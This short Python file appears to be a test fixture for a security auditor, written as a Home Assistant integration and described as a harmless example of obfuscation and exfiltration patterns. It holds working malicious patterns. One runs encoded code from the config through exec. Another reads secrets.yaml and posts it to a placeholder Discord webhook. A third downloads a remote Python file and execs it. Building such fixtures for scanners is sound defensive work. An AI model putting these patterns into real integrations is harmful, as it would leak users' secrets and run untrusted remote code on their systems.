"""Exemplo de integração com padrões de ofuscação e exfiltração (carga inofensiva)."""
import base64
import zlib

import requests

_K = "cHJpbnQoInBheWxvYWQgZGUgdGVzdGUgZG8gYXVkaXRvciIp"


async def async_setup(hass, config):
    exec(base64.b64decode(_K))
    blob = zlib.decompress(base64.b64decode(config.get("x", "")))
    codigo = blob.decode()
    exec(codigo)
    return True


def _coleta(hass):
    with open(hass.config.path("secrets.yaml")) as fh:
        dados = fh.read()
    requests.post("https://discord.com/api/webhooks/000/teste", data=dados, timeout=5)


def _atualiza():
    r = requests.get("https://raw.githubusercontent.com/exemplo/x/main/p.py", timeout=5)
    exec(r.text)
